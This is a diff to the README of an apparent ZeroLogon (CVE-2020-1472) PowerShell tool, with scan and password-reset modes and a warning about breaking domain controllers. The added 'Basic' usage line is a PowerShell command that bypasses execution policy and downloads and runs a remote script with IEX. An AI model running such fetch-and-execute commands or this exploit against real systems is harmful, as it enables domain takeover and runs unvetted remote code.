@@ -5,3 +5,11 @@ This script can be run in two modes:
 2.	By default, reset is set to False and will simply scan if the target computer is vulnerable to the ZeroLogon exploit (CVE-2020-1472).
 
 __WARNING:__ Resetting the password of a Domain Controller is likely to break the network. __DO NOT__ use the reset parameter against a production system unless you fully understand the risks and have explicit permission.
+
+
+Basic - 
+
+powershell.exe –exec bypass –C “IEX(New-Object Net.WebClient).DownloadString(’https://raw.githubusercontent.com/sp00ks-git/Invoke-ZeroLogon/master/Invoke-ZeroLogon.ps1’)”
+
+
+
